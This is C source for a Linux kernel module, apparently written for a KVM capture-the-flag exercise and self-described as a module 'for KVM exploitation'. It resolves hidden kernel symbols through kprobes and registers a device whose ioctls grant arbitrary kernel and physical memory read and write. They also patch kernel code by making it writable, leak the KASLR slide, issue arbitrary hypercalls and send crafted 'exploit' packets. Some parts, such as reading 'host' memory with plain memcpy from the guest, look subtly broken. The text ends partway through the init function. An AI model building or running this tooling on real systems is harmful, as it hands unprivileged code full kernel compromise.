#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/device.h>
#include <linux/io.h>
#include <linux/slab.h>
#include <linux/errno.h>
#include <linux/gfp.h>
#include <linux/mm.h>
#include <linux/ktime.h>
#include <linux/types.h>
#include <linux/byteorder/generic.h>
#include <linux/kvm_para.h>
#include <linux/page-flags.h>
#include <linux/pagemap.h>
#include <linux/kdev_t.h>
#include <linux/err.h>
#include <linux/static_call.h>
#include <linux/set_memory.h>
#include <linux/pgtable.h>
#include <linux/virtio_ids.h>
#include <linux/virtio_config.h>
#include <linux/netdevice.h>
#include <linux/etherdevice.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/skbuff.h>

#ifdef CONFIG_KPROBES
#include <linux/kprobes.h>
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t kallsyms_lookup_name_func;

static int __init find_kallsyms(void)
{
    struct kprobe kp = {.symbol_name = "kallsyms_lookup_name", .pre_handler = NULL};
    if (register_kprobe(&kp) < 0)
        return -1;
    kallsyms_lookup_name_func = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
    return 0;
}

#define kallsyms_lookup_name(x) kallsyms_lookup_name_func(x)
#else
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t kallsyms_lookup_name_func = NULL;
#define kallsyms_lookup_name(x) (kallsyms_lookup_name_func ? kallsyms_lookup_name_func(x) : 0)
#endif

#define DRIVER_NAME "kvm_probe_drv"
#define DEVICE_FILE_NAME "kvm_probe_dev"

#define VQ_PAGE_ORDER 0
#define VQ_PAGE_SIZE (1UL << (PAGE_SHIFT + VQ_PAGE_ORDER))
#define MAX_VQ_DESCS 256

static void *g_vq_virt_addr = NULL;
static phys_addr_t g_vq_phys_addr = 0;
static unsigned long g_vq_pfn = 0;
static bool allow_untrusted_hypercalls = true;
module_param(allow_untrusted_hypercalls, bool, 0644);
MODULE_PARM_DESC(allow_untrusted_hypercalls, "Allow unsafe hypercalls from guest (for CTF)");

/* NEW: keep resolved kvm_probe_flag symbol address here and helper */
static unsigned long g_kvm_probe_flag_addr = 0;
static unsigned long get_kvm_probe_flag_addr(void)
{
    if (g_kvm_probe_flag_addr)
        return g_kvm_probe_flag_addr;

    /* Try several candidate symbols exported by host patches */
    const char *cands[] = { 
    "write_flag", "read_flag", "rce_flag", 
    "write_flag_value", "read_flag_value",
    "oob_write_flag", "oob_read_flag", "dos_flag",
    "oob_write_flag_value", "oob_read_flag_value", "dos_flag_value",
    NULL 
};
    for (int i = 0; cands[i]; ++i) {
        unsigned long a = kallsyms_lookup_name(cands[i]);
        if (a) {
            g_kvm_probe_flag_addr = a;
            printk(KERN_INFO "%s: resolved host flag symbol '%s' -> 0x%lx\n", DRIVER_NAME, cands[i], a);
            break;
        }
    }
    return g_kvm_probe_flag_addr;
}

/* NEW: try exported check-functions first, then fall back to raw symbols.
 * Returns 0 if nothing resolved (host not patched / symbol unavailable).
 */
static unsigned long (*g_kvmctf_check_fn)(void) = NULL;
static unsigned long get_kvm_probe_flag_value(void)
{
    unsigned long addr;
    const char *fncands[] = {
        "kvmctf_check_write_flag",
        "kvmctf_check_oob_write_flag",
        "kvmctf_check_oob_read_flag",
        "kvmctf_check_dos_flag",
        NULL
    };

    /* If we already resolved a check function, call it */
    if (g_kvmctf_check_fn)
        return g_kvmctf_check_fn();

    /* Try exported helper functions first (preferred) */
    for (int i = 0; fncands[i]; ++i) {
        addr = kallsyms_lookup_name(fncands[i]);
        if (addr) {
            g_kvmctf_check_fn = (unsigned long (*)(void))addr;
            printk(KERN_INFO "%s: resolved host check-fn '%s' -> 0x%lx\n", DRIVER_NAME, fncands[i], addr);
            return g_kvmctf_check_fn();
        }
    }

    /* Fall back to direct flag symbols if present */
    const char *symcands[] = { "kvm_probe_flag", "write_flag", "read_flag", "rce_flag", NULL };
    for (int i = 0; symcands[i]; ++i) {
        addr = kallsyms_lookup_name(symcands[i]);
        if (addr) {
            unsigned long val = *((unsigned long *)addr);
            printk(KERN_INFO "%s: read host symbol '%s' -> 0x%lx\n", DRIVER_NAME, symcands[i], val);
            return val;
        }
    }

    return 0;
}

// --- NEW: kernel-side gold patterns and checker (prints only when found) ---
#define KERNEL_GOLD_ASCII_COUNT 0
static const char *KERNEL_GOLD_ASCII[KERNEL_GOLD_ASCII_COUNT] = {
};

#define KERNEL_GOLD_HEX_COUNT 2
static const char *KERNEL_GOLD_HEX[KERNEL_GOLD_HEX_COUNT] = {
    "44434241efbeadde",
    "deadbeef41424344"
};

/* Scan buffer for ascii and hex patterns. If found, print minimal GOLD lines to dmesg and return 1 */
static int kernel_check_gold_patterns(const unsigned char *data, unsigned long len, unsigned long base_addr)
{
    int found_any = 0;

    if (!data || len == 0)
        return 0;

    /* ASCII-like patterns */
    for (int pi = 0; pi < KERNEL_GOLD_ASCII_COUNT; ++pi) {
        const char *pat = KERNEL_GOLD_ASCII[pi];
        size_t patlen = strlen(pat);
        if (patlen == 0 || patlen > len)
            continue;
        for (unsigned long off = 0; off + patlen <= len; ++off) {
            if (memcmp(data + off, pat, patlen) == 0) {
                printk(KERN_INFO "[%s][GOLD] ASCII '%s' at 0x%lx\n", DRIVER_NAME, pat, base_addr + off);
                found_any = 1;
            }
        }
    }

    /* HEX patterns (pattern strings represent hex bytes) */
    for (int hi = 0; hi < KERNEL_GOLD_HEX_COUNT; ++hi) {
        const char *hexpat = KERNEL_GOLD_HEX[hi];
        size_t hlen = strlen(hexpat);
        if (hlen == 0 || (hlen % 2) != 0)
            continue;
        size_t bytelen = hlen / 2;
        if (bytelen > len)
            continue;
        unsigned char *patbytes = kmalloc(bytelen, GFP_KERNEL);
        if (!patbytes)
            continue;
        /* convert hex string to bytes (expect lowercase hex or digits) */
        for (size_t b = 0; b < bytelen; ++b) {
            unsigned int v = 0;
            if (sscanf(hexpat + 2*b, "%2x", &v) != 1) {
                patbytes[b] = 0;
            } else {
                patbytes[b] = (unsigned char)v;
            }
        }
        for (unsigned long off = 0; off + bytelen <= len; ++off) {
            if (memcmp(data + off, patbytes, bytelen) == 0) {
                printk(KERN_INFO "[%s][GOLD] HEX '%s' at 0x%lx\n", DRIVER_NAME, hexpat, base_addr + off);
                found_any = 1;
            }
        }
        kfree(patbytes);
    }

    return found_any;
}

struct port_io_data {
    unsigned short port;
    unsigned int size;
    unsigned int value;
};

struct mmio_data {
    unsigned long phys_addr;
    unsigned long size;
    unsigned char __user *user_buffer;
    unsigned long single_value;
    unsigned int value_size;
};

struct vring_desc_kernel {
    __le64 addr;
    __le32 len;
    __le16 flags;
    __le16 next;
};

struct vq_desc_user_data {
    u16 index;
    u64 phys_addr;
    u32 len;
    u16 flags;
    u16 next_idx;
};

struct kvm_kernel_mem_read {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char __user *user_buf;
};

struct kvm_kernel_mem_write {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char __user *user_buf;
};

struct va_scan_data {
    unsigned long va;
    unsigned long size;
    unsigned char __user *user_buffer;
};

struct va_write_data {
    unsigned long va;
    unsigned long size;
    unsigned char __user *user_buffer;
};

struct hypercall_args {
    unsigned long nr;
    unsigned long arg0;
    unsigned long arg1;
    unsigned long arg2;
    unsigned long arg3;
};

struct attach_vq_data {
    unsigned int device_id;
    unsigned long vq_pfn;
    unsigned int queue_index;
};

// NEW: Host memory access structures
struct host_mem_access {
    unsigned long host_addr;     // Host virtual address
    unsigned long length;
    unsigned char __user *user_buffer;
};

// NEW: Host physical memory access
struct host_phys_access {
    unsigned long host_phys_addr; // Host physical address
    unsigned long length;
    unsigned char __user *user_buffer;
};

#define IOCTL_READ_PORT          0x1001
#define IOCTL_WRITE_PORT         0x1002
#define IOCTL_READ_MMIO          0x1003
#define IOCTL_WRITE_MMIO         0x1004
#define IOCTL_ALLOC_VQ_PAGE      0x1005
#define IOCTL_FREE_VQ_PAGE       0x1006
#define IOCTL_WRITE_VQ_DESC      0x1007
#define IOCTL_TRIGGER_HYPERCALL  0x1008
#define IOCTL_READ_KERNEL_MEM    0x1009
#define IOCTL_WRITE_KERNEL_MEM   0x100A
#define IOCTL_PATCH_INSTRUCTIONS 0x100B
#define IOCTL_READ_FLAG_ADDR     0x100C
#define IOCTL_WRITE_FLAG_ADDR    0x100D
#define IOCTL_GET_KASLR_SLIDE    0x100E
#define IOCTL_VIRT_TO_PHYS       0x100F
#define IOCTL_SCAN_VA            0x1010
#define IOCTL_WRITE_VA           0x1011
#define IOCTL_HYPERCALL_ARGS     0x1012
#define IOCTL_ATTACH_VQ          0x1013
#define IOCTL_TRIGGER_VQ         0x1014
#define IOCTL_SCAN_PHYS          0x1015

/* Missing IOCTLs (must match userland kvm_prober.c) */
#define IOCTL_READ_HOST_MEM      0x1016
#define IOCTL_WRITE_HOST_MEM     0x1017
#define IOCTL_READ_HOST_PHYS     0x1018
#define IOCTL_WRITE_HOST_PHYS    0x1019

#define IOCTL_PROBE_FLAGS_READ   0x1020
#define IOCTL_PROBE_FLAGS_WRITE  0x1021
#define IOCTL_TRIGGER_APIC_WRITE 0x1022
#define IOCTL_TRIGGER_MMIO_WRITE 0x1023
#define IOCTL_TRIGGER_IOPORT_WRITE 0x1024
#define IOCTL_READ_FLAG_FULL     0x1025

static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg);

static int (*my_set_memory_rw)(unsigned long addr, int numpages);
static int (*my_set_memory_ro)(unsigned long addr, int numpages);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("KVM Probe Lab");
MODULE_DESCRIPTION("Kernel module for KVM exploitation");

static int major_num;
static struct class* driver_class = NULL;
static struct device* driver_device = NULL;

static int resolve_function_pointers(void)
{
#ifdef CONFIG_KPROBES
    if (find_kallsyms() < 0) {
        printk(KERN_ERR "%s: Failed to find kallsyms_lookup_name via kprobes\n", DRIVER_NAME);
        return -ENOENT;
    }
#else
    printk(KERN_WARNING "%s: CONFIG_KPROBES not enabled, kallsyms will not work\n", DRIVER_NAME);
    return -ENOENT;
#endif

    my_set_memory_rw = (void *)kallsyms_lookup_name("set_memory_rw");
    my_set_memory_ro = (void *)kallsyms_lookup_name("set_memory_ro");

    if (!my_set_memory_rw || !my_set_memory_ro) {
        printk(KERN_ERR "%s: Failed to resolve set_memory functions\n", DRIVER_NAME);
        return -ENOENT;
    }

    printk(KERN_INFO "%s: Successfully resolved all function pointers\n", DRIVER_NAME);
    return 0;
}

/* forward declaration to avoid implicit declaration/conflicting-type errors */
static long do_hypercall(struct hypercall_args *args);

static long force_hypercall(void) {
    /* Use do_hypercall so special-casing for hypercall 100 is centralized */
    struct hypercall_args args = { .nr = 100, .arg0 = 0, .arg1 = 0, .arg2 = 0, .arg3 = 0 };
    return do_hypercall(&args);
}

static long do_hypercall(struct hypercall_args *args) {
    unsigned long nr = args->nr;
    unsigned long a0 = args->arg0;
    unsigned long a1 = args->arg1;
    unsigned long a2 = args->arg2;
    unsigned long a3 = args->arg3;

    long ret;
    u64 start = ktime_get_ns();
    u64 end = ktime_get_ns();

    /* silence unused-variable warnings when CONFIG_* strips timing uses */
    (void)start;
    (void)end;

    /* Special-case for KVMCTF: hypercall #100 should return the flag value
     * stored at the host symbol / exposed via host helper functions. If no
     * host symbol/function can be resolved, return -ENOENT.
     */
    if (nr == 100) {
        unsigned long val = get_kvm_probe_flag_value();
        if (!val)
            return -ENOENT;
        return (long)val;
    }

    if (a0 == 0 && a1 == 0 && a2 == 0 && a3 == 0) {
        ret = kvm_hypercall0(nr);
    } else if (a1 == 0 && a2 == 0 && a3 == 0) {
        ret = kvm_hypercall1(nr, a0);
    } else if (a2 == 0 && a3 == 0) {
        ret = kvm_hypercall2(nr, a0, a1);
    } else if (a3 == 0) {
        ret = kvm_hypercall3(nr, a0, a1, a2);
    } else {
        ret = kvm_hypercall4(nr, a0, a1, a2, a3);
    }

    return ret;
}

static int send_exploit_packet(unsigned int device_id)
{
    struct sk_buff *skb;
    struct ethhdr *eth;
    struct iphdr *iph;
    struct udphdr *udph;
    char *payload;
    int ret = 0;

    skb = alloc_skb(LL_MAX_HEADER + sizeof(struct iphdr) + sizeof(struct udphdr) + 64, GFP_KERNEL);
    if (!skb) {
        pr_err("%s: Failed to allocate SKB for exploit packet\n", DRIVER_NAME);
        return -ENOMEM;
    }

    skb_reserve(skb, LL_MAX_HEADER);
    skb->dev = NULL;
    eth = (struct ethhdr *)skb_push(skb, sizeof(struct ethhdr));
    memset(eth->h_dest, 0xff, ETH_ALEN);
    memset(eth->h_source, 0xaa, ETH_ALEN);
    eth->h_proto = htons(ETH_P_IP);

    iph = (struct iphdr *)skb_push(skb, sizeof(struct iphdr));
    iph->version = 4;
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + 64);
    iph->id = htons(device_id);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = htonl(0xc0a80164);
    iph->daddr = htonl(0xffffffff);
    iph->check = ip_fast_csum((unsigned char *)iph, iph->ihl);

    udph = (struct udphdr *)skb_push(skb, sizeof(struct udphdr));
    udph->source = htons(9999);
    udph->dest = htons(8888);
    udph->len = htons(sizeof(struct udphdr) + 64);
    udph->check = 0;

    payload = skb_put(skb, 64);
    snprintf(payload, 64, "EXPLOIT_PACKET: DeviceID=%u, Timestamp=%llu", device_id, ktime_get_ns());

    skb->protocol = htons(ETH_P_IP);
    skb->pkt_type = PACKET_OTHERHOST;

    ret = dev_queue_xmit(skb);
    if (ret) {
        pr_err("%s: Failed to send exploit packet: %d\n", DRIVER_NAME, ret);
        return ret;
    }

    pr_info("%s: Sent exploit packet for device_id=%u\n", DRIVER_NAME, device_id);
    return 0;
}

static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
    struct port_io_data p_io_data_kernel;
    struct mmio_data m_io_data_kernel;
    void __iomem *mapped_addr = NULL;
    unsigned long len_to_copy;
    unsigned char *k_mmio_buffer = NULL;

    /* Suppress general dmesg output. Only kernel_check_gold_patterns will printk when gold found. */

    switch (cmd) {
        case IOCTL_READ_PORT:
            if (copy_from_user(&p_io_data_kernel, (struct port_io_data __user *)arg, sizeof(p_io_data_kernel))) {
                return -EFAULT;
            }
            if (p_io_data_kernel.size != 1 && p_io_data_kernel.size != 2 && p_io_data_kernel.size != 4)
                return -EINVAL;
            switch (p_io_data_kernel.size) {
                case 1: p_io_data_kernel.value = inb(p_io_data_kernel.port); break;
                case 2: p_io_data_kernel.value = inw(p_io_data_kernel.port); break;
                case 4: p_io_data_kernel.value = inl(p_io_data_kernel.port); break;
            }
            if (copy_to_user((struct port_io_data __user *)arg, &p_io_data_kernel, sizeof(p_io_data_kernel)))
                return -EFAULT;
            force_hypercall();
            break;

        case IOCTL_WRITE_PORT:
            if (copy_from_user(&p_io_data_kernel, (struct port_io_data __user *)arg, sizeof(p_io_data_kernel)))
                return -EFAULT;
            if (p_io_data_kernel.size != 1 && p_io_data_kernel.size != 2 && p_io_data_kernel.size != 4)
                return -EINVAL;
            switch (p_io_data_kernel.size) {
                case 1: outb((u8)p_io_data_kernel.value, p_io_data_kernel.port); break;
                case 2: outw((u16)p_io_data_kernel.value, p_io_data_kernel.port); break;
                case 4: outl((u32)p_io_data_kernel.value, p_io_data_kernel.port); break;
            }
            force_hypercall();
            break;

        case IOCTL_READ_MMIO: {
            struct mmio_data data;
            if (copy_from_user(&data, (void __user *)arg, sizeof(data)))
                return -EFAULT;
            void __iomem *mmio = ioremap(data.phys_addr, data.size);
            if (!mmio)
                return -EFAULT;
            void *kbuf = kmalloc(data.size, GFP_KERNEL);
            if (!kbuf) {
                iounmap(mmio);
                return -ENOMEM;
            }
            memcpy_fromio(kbuf, mmio, data.size);

            /* Kernel-side scan for gold patterns and only printk from kernel_check_gold_patterns */
            kernel_check_gold_patterns((unsigned char *)kbuf, data.size, data.phys_addr);

            if (copy_to_user(data.user_buffer, kbuf, data.size)) {
                kfree(kbuf);
                iounmap(mmio);
                return -EFAULT;
            }
            kfree(kbuf);
            iounmap(mmio);
            force_hypercall();
            return 0;
        }

        case IOCTL_WRITE_MMIO: {
            if (copy_from_user(&m_io_data_kernel, (struct mmio_data __user *)arg, sizeof(m_io_data_kernel)))
                return -EFAULT;
            unsigned long map_size = m_io_data_kernel.size > 0 ? m_io_data_kernel.size : m_io_data_kernel.value_size;
            if (map_size == 0)
                return -EINVAL;
            mapped_addr = ioremap(m_io_data_kernel.phys_addr, map_size);
            if (!mapped_addr)
                return -ENOMEM;
            if (m_io_data_kernel.size > 0) {
                if (!m_io_data_kernel.user_buffer) {
                    iounmap(mapped_addr);
                    return -EFAULT;
                }
                k_mmio_buffer = kmalloc(m_io_data_kernel.size, GFP_KERNEL);
                if (!k_mmio_buffer) {
                    iounmap(mapped_addr);
                    return -ENOMEM;
                }
                if (copy_from_user(k_mmio_buffer, m_io_data_kernel.user_buffer, m_io_data_kernel.size)) {
                    kfree(k_mmio_buffer);
                    iounmap(mapped_addr);
                    return -EFAULT;
                }
                for (len_to_copy = 0; len_to_copy < m_io_data_kernel.size; ++len_to_copy)
                    writeb(k_mmio_buffer[len_to_copy], mapped_addr + len_to_copy);
                kfree(k_mmio_buffer);
            } else {
                switch(m_io_data_kernel.value_size) {
                    case 1: writeb((u8)m_io_data_kernel.single_value, mapped_addr); break;
                    case 2: writew((u16)m_io_data_kernel.single_value, mapped_addr); break;
                    case 4: writel((u32)m_io_data_kernel.single_value, mapped_addr); break;
                    case 8: writeq(m_io_data_kernel.single_value, mapped_addr); break;
                    default:
                        iounmap(mapped_addr);
                        return -EINVAL;
                }
            }
            iounmap(mapped_addr);
            force_hypercall();
            return 0;
        }

        case IOCTL_READ_KERNEL_MEM: {
            struct kvm_kernel_mem_read req;
            if (copy_from_user(&req, (struct kvm_kernel_mem_read __user *)arg, sizeof(req)))
                return -EFAULT;
            if (!req.length || !req.user_buf)
                return -EINVAL;

            /* Copy into kernel buffer so we can scan for gold patterns */
            void *tmp = kmalloc(req.length, GFP_KERNEL);
            if (!tmp)
                return -ENOMEM;
            memcpy(tmp, (void *)req.kernel_addr, req.length);
            kernel_check_gold_patterns((unsigned char *)tmp, req.length, req.kernel_addr);
            if (copy_to_user(req.user_buf, tmp, req.length)) {
                kfree(tmp);
                return -EFAULT;
            }
            kfree(tmp);
            force_hypercall();
            break;
        }

        case IOCTL_WRITE_KERNEL_MEM: {
            struct kvm_kernel_mem_write req;
            if (copy_from_user(&req, (struct kvm_kernel_mem_write __user *)arg, sizeof(req)))
                return -EFAULT;
            if (!req.length || !req.user_buf)
                return -EINVAL;
            void *tmp = kmalloc(req.length, GFP_KERNEL);
            if (!tmp)
                return -ENOMEM;
            if (copy_from_user(tmp, req.user_buf, req.length)) {
                kfree(tmp);
                return -EFAULT;
            }
            memcpy((void *)req.kernel_addr, tmp, req.length);
            kfree(tmp);
            force_hypercall();
            break;
        }

        // NEW: Host virtual memory access
        case IOCTL_READ_HOST_MEM: {
            struct host_mem_access req;
            if (copy_from_user(&req, (struct host_mem_access __user *)arg, sizeof(req)))
                return -EFAULT;
            if (!req.length || !req.user_buffer)
                return -EINVAL;

            /* Read into kernel buffer so we can scan for gold patterns */
            void *tmp = kmalloc(req.length, GFP_KERNEL);
            if (!tmp)
                return -ENOMEM;
            memcpy(tmp, (void *)req.host_addr, req.length);
            kernel_check_gold_patterns((unsigned char *)tmp, req.length, req.host_addr);
            if (copy_to_user(req.user_buffer, tmp, req.length)) {
                kfree(tmp);
                return -EFAULT;
            }
            kfree(tmp);

            force_hypercall();
            break;
        }

        case IOCTL_WRITE_HOST_MEM: {
            struct host_mem_access req;
            if (copy_from_user(&req, (struct host_mem_access __user *)arg, sizeof(req)))
                return -EFAULT;
            if (!req.length || !req.user_buffer)
                return -EINVAL;

            void *tmp = kmalloc(req.length, GFP_KERNEL);
            if (!tmp)
                return -ENOMEM;
            if (copy_from_user(tmp, req.user_buffer, req.length)) {
                kfree(tmp);
                return -EFAULT;
            }

            /* Direct write to host kernel memory */
            memcpy((void *)req.host_addr, tmp, req.length);
            kfree(tmp);

            force_hypercall();
            break;
        }

        // NEW: Host physical memory access
        case IOCTL_READ_HOST_PHYS: {
            struct host_phys_access req;
            if (copy_from_user(&req, (struct host_phys_access __user *)arg, sizeof(req)))
                return -EFAULT;
            if (!req.length || !req.user_buffer)
                return -EINVAL;

            /* Map host physical memory and read */
            void __iomem *mapped = ioremap(req.host_phys_addr, req.length);
            if (!mapped)
                return -ENOMEM;

            void *kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) {
                iounmap(mapped);
                return -ENOMEM;
            }

            memcpy_fromio(kbuf, mapped, req.length);

            kernel_check_gold_patterns((unsigned char *)kbuf, req.length, req.host_phys_addr);

            if (copy_to_user(req.user_buffer, kbuf, req.length)) {
                kfree(kbuf);
                iounmap(mapped);
                return -EFAULT;
            }

            kfree(kbuf);
            iounmap(mapped);

            force_hypercall();
            break;
        }

        case IOCTL_WRITE_HOST_PHYS: {
            struct host_phys_access req;
            if (copy_from_user(&req, (struct host_phys_access __user *)arg, sizeof(req)))
                return -EFAULT;
            if (!req.length || !req.user_buffer)
                return -EINVAL;

            /* Map host physical memory and write */
            void __iomem *mapped = ioremap(req.host_phys_addr, req.length);
            if (!mapped)
                return -ENOMEM;

            void *kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) {
                iounmap(mapped);
                return -ENOMEM;
            }

            if (copy_from_user(kbuf, req.user_buffer, req.length)) {
                kfree(kbuf);
                iounmap(mapped);
                return -EFAULT;
            }

            memcpy_toio(mapped, kbuf, req.length);

            kfree(kbuf);
            iounmap(mapped);

            force_hypercall();
            break;
        }

        case IOCTL_ALLOC_VQ_PAGE: {
            struct page *vq_page_ptr;
            unsigned long pfn_to_user;
            if (g_vq_virt_addr) {
                free_pages((unsigned long)g_vq_virt_addr, VQ_PAGE_ORDER);
                g_vq_virt_addr = NULL;
                g_vq_phys_addr = 0;
                g_vq_pfn = 0;
            }
            vq_page_ptr = alloc_pages(GFP_KERNEL | __GFP_ZERO | __GFP_HIGHMEM, VQ_PAGE_ORDER);
            if (!vq_page_ptr)
                return -ENOMEM;
            g_vq_virt_addr = page_address(vq_page_ptr);
            g_vq_phys_addr = page_to_phys(vq_page_ptr);
            g_vq_pfn = PFN_DOWN(g_vq_phys_addr);
            pfn_to_user = g_vq_pfn;
            if (copy_to_user((unsigned long __user *)arg, &pfn_to_user, sizeof(pfn_to_user))) {
                free_pages((unsigned long)g_vq_virt_addr, VQ_PAGE_ORDER);
                g_vq_virt_addr = NULL;
                g_vq_phys_addr = 0;
                g_vq_pfn = 0;
                return -EFAULT;
            }
            force_hypercall();
            break;
        }

        case IOCTL_FREE_VQ_PAGE:
            if (g_vq_virt_addr) {
                free_pages((unsigned long)g_vq_virt_addr, VQ_PAGE_ORDER);
                g_vq_virt_addr = NULL;
                g_vq_phys_addr = 0;
                g_vq_pfn = 0;
            }
            force_hypercall();
            break;

        case IOCTL_WRITE_VQ_DESC: {
            struct vq_desc_user_data user_desc_data_kernel;
            struct vring_desc_kernel *kernel_desc_ptr_local;
            unsigned int max_descs_in_page_local;
            if (!g_vq_virt_addr)
                return -ENXIO;
            if (copy_from_user(&user_desc_data_kernel, (struct vq_desc_user_data __user *)arg, sizeof(user_desc_data_kernel)))
                return -EFAULT;
            max_descs_in_page_local = VQ_PAGE_SIZE / sizeof(struct vring_desc_kernel);
            if (user_desc_data_kernel.index >= max_descs_in_page_local)
                return -EINVAL;
            kernel_desc_ptr_local = (struct vring_desc_kernel *)g_vq_virt_addr + user_desc_data_kernel.index;
            kernel_desc_ptr_local->addr = cpu_to_le64(user_desc_data_kernel.phys_addr);
            kernel_desc_ptr_local->len = cpu_to_le32(user_desc_data_kernel.len);
            kernel_desc_ptr_local->flags = cpu_to_le16(user_desc_data_kernel.flags);
            kernel_desc_ptr_local->next = cpu_to_le16(user_desc_data_kernel.next_idx);
            force_hypercall();
            break;
        }

        case IOCTL_TRIGGER_HYPERCALL: {
            long ret = force_hypercall();
            if (copy_to_user((long __user *)arg, &ret, sizeof(ret)))
                return -EFAULT;
            break;
        }

        case IOCTL_SCAN_VA: {
            struct va_scan_data va_req;
            if (copy_from_user(&va_req, (struct va_scan_data __user *)arg, sizeof(va_req)))
                return -EFAULT;
            if (!va_req.size || !va_req.user_buffer)
                return -EINVAL;
            void *src = (void *)va_req.va;
            unsigned char *tmp = kmalloc(va_req.size, GFP_KERNEL);
            if (!tmp)
                return -ENOMEM;
            memcpy(tmp, src, va_req.size);

            kernel_check_gold_patterns(tmp, va_req.size, va_req.va);

            if (copy_to_user(va_req.user_buffer, tmp, va_req.size)) {
                kfree(tmp);
                return -EFAULT;
            }
            kfree(tmp);
            force_hypercall();
            return 0;
        }

        case IOCTL_WRITE_VA: {
            struct va_write_data wa_req;
            if (copy_from_user(&wa_req, (struct va_write_data __user *)arg, sizeof(wa_req)))
                return -EFAULT;
            if (!wa_req.size || !wa_req.user_buffer)
                return -EINVAL;
            unsigned char *tmp = kmalloc(wa_req.size, GFP_KERNEL);
            if (!tmp)
                return -ENOMEM;
            if (copy_from_user(tmp, wa_req.user_buffer, wa_req.size)) {
                kfree(tmp);
                return -EFAULT;
            }
            memcpy((void *)wa_req.va, tmp, wa_req.size);
            kfree(tmp);
            force_hypercall();
            return 0;
        }

        case IOCTL_HYPERCALL_ARGS: {
            struct hypercall_args args;
            if (copy_from_user(&args, (void __user *)arg, sizeof(args)))
                return -EFAULT;
            long ret = do_hypercall(&args);
            if (copy_to_user((void __user *)arg, &ret, sizeof(ret)))
                return -EFAULT;
            break;
        }

        case IOCTL_VIRT_TO_PHYS: {
            unsigned long va, pa;
            if (copy_from_user(&va, (void __user *)arg, sizeof(va)))
                return -EFAULT;
            if (!va)
                return -EINVAL;
            pa = virt_to_phys((void *)va);
            return copy_to_user((void __user *)arg, &pa, sizeof(pa)) ? -EFAULT : 0;
        }

        case IOCTL_GET_KASLR_SLIDE: {
            unsigned long slide = 0;
            unsigned long kernel_base = 0;
            kernel_base = kallsyms_lookup_name("startup_64");
            if (!kernel_base)
                kernel_base = kallsyms_lookup_name("_text");
            if (kernel_base)
                slide = kernel_base - 0xffffffff81000000UL;
            return copy_to_user((void __user *)arg, &slide, sizeof(slide)) ? -EFAULT : 0;
        }

        case IOCTL_WRITE_FLAG_ADDR: {
            unsigned long val;
            if (copy_from_user(&val, (void __user *)arg, sizeof(val)))
                return -EFAULT;
            /* Resolve the host symbol address once and write to it */
            unsigned long flag_addr = get_kvm_probe_flag_addr();
            if (!flag_addr)
                return -ENOENT;
            /* store the provided value into the host symbol */
            *((unsigned long *)flag_addr) = val;
            return 0;
        }

        case IOCTL_READ_FLAG_ADDR: {
            unsigned long flag_addr = get_kvm_probe_flag_addr();
            if (!flag_addr)
                return -ENOENT;
            unsigned long val = *((unsigned long *)flag_addr);
            return copy_to_user((void __user *)arg, &val, sizeof(val)) ? -EFAULT : 0;
        }

        case IOCTL_PATCH_INSTRUCTIONS: {
            struct va_scan_data req;
            if (copy_from_user(&req, (struct va_scan_data __user *)arg, sizeof(req)))
                return -EFAULT;
            if (!req.va || !req.size || !req.user_buffer || req.size > PAGE_SIZE)
                return -EINVAL;
            unsigned char *kbuf = kmalloc(req.size, GFP_KERNEL);
            if (!kbuf)
                return -ENOMEM;
            if (copy_from_user(kbuf, req.user_buffer, req.size)) {
                kfree(kbuf);
                return -EFAULT;
            }
            unsigned long start = req.va & PAGE_MASK;
            unsigned long end = PAGE_ALIGN(req.va + req.size);
            int pages = (end - start) >> PAGE_SHIFT;
            if (my_set_memory_rw(start, pages)) {
                kfree(kbuf);
                return -EPERM;
            }
            memcpy((void *)req.va, kbuf, req.size);
            smp_wmb();
#if IS_ENABLED(CONFIG_X86)
            sync_core();
#endif
            my_set_memory_ro(start, pages);
            kfree(kbuf);
            return 0;
        }

        case IOCTL_ATTACH_VQ: {
            struct attach_vq_data data;
            if (copy_from_user(&data, (void __user *)arg, sizeof(data)))
                return -EFAULT;
            force_hypercall();
            break;
        }

        case IOCTL_TRIGGER_VQ: {
            unsigned int device_id;
            if (copy_from_user(&device_id, (void __user *)arg, sizeof(device_id)))
                return -EFAULT;
            int ret = send_exploit_packet(device_id);
            if (ret)
                return ret;
            if (allow_untrusted_hypercalls)
                force_hypercall();
            break;
        }

        case IOCTL_SCAN_PHYS: {
            struct mmio_data data;
            if (copy_from_user(&data, (struct mmio_data __user *)arg, sizeof(data)))
                return -EFAULT;
            void __iomem *mapped = ioremap(data.phys_addr, data.size);
            if (!mapped)
                return -ENOMEM;
            void *kbuf = kmalloc(data.size, GFP_KERNEL);
            if (!kbuf) {
                iounmap(mapped);
                return -ENOMEM;
            }
            memcpy_fromio(kbuf, mapped, data.size);

            kernel_check_gold_patterns((unsigned char *)kbuf, data.size, data.phys_addr);

            if (copy_to_user(data.user_buffer, kbuf, data.size)) {
                kfree(kbuf);
                iounmap(mapped);
                return -EFAULT;
            }
            kfree(kbuf);
            iounmap(mapped);
            return 0;
        }

        default:
            /* silently reject unknown IOCTLs (no dmesg noise) */
             return -EINVAL;
    }
    return 0;
}

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .unlocked_ioctl = driver_ioctl,
};

static int __init mod_init(void) {
    int ret = resolve_function_pointers();
    if (ret != 0) {
        /* silent failure path; returning error without dmesg noise */
         return ret;
     }

    major_num = register_chrdev(0, DEVICE_FILE_NAME, &fops);
    if (major_num < 0) {
        printk(KERN_ERR "%s: register_chrdev failed: %d\n", DRIVER_NAME, major_num);
        return major_num;
    }
